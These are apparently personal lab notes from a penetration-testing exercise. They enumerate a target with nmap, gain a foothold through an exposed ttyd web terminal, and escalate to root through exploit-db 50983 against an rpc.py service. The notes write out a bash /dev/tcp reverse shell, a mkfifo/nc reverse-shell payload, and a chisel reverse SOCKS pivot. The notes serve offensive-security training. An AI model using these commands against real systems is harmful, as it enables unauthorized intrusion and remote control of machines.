### Enumeration
```
IP=192.168.163.210
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,8000 -A $IP
```
### Ports 
- 22
	- OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
- 8000
	- http-alt ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
### Foothold
- 8000
	- Default landing page
		- ![[Pasted image 20240716090538.png]]
		- `/bin/bash -i >& /dev/tcp/192.168.45.195/22 0>&1`
		- To get rce
### PE
#### Linux
- user
	- id
		- uid=1000(user) gid=1000(user) groups=1000(user)
	- sudo -l
		- needs password
	- uname -a
		- `Linux pc 5.4.0-156-generic #173-Ubuntu SMP Tue Jul 11 07:25:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux`
	- getcap -r / 2>/dev/null
		- ![[Pasted image 20240716090847.png]]
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- nothing
	- Users with console
		- user
	- linpeas
		- possible exploits
			- pwnkit
		- Sudo version 1.8.31
		- Checking Pkexec policy
			- AdminIdentities=unix-user:0
			- /usr/bin/pkexec suid
		- root running - python3 /opt/rpc.py
			- running on port 65432
			- google rpc py
				- exploit-db 50983  rpc.py 0.6
				- Edit command, remove all the 3D
				- Edit payload to: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.195 22 >/tmp/f`
				- Get rev shell as sudo
		- netstat -ano
			- ports
				- 8000
				- 53
				- 65432
				- 42840  -  connects to shell
	- pivot
		- On A: ./chisel_1.5.1_linux_386 server -p 8000 --reverse
		- On B: ./chisel_1.5.1_linux_386 client -v 192.168.45.195:8000 R:socks
		- sudo proxychains nmap -p 65432 127.0.0.1 -sT -A
			- did not finish
		- proxychains python3 50983.py
			- run rpc.py exploit
### Credentials
### Lessons Learned
- Look through the running process carefully
- Cleaned processes in linpeas output had the rpc.py